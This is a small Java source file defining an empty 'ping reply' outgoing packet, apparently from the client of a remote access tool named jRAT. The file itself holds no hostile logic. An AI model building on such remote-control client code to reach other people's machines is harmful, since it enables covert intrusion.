package jrat.client.packets.outgoing;

import jrat.client.Connection;

public class Packet0PingReply extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {

	}

	@Override
	public short getPacketId() {
		return (byte) 0;
	}

}
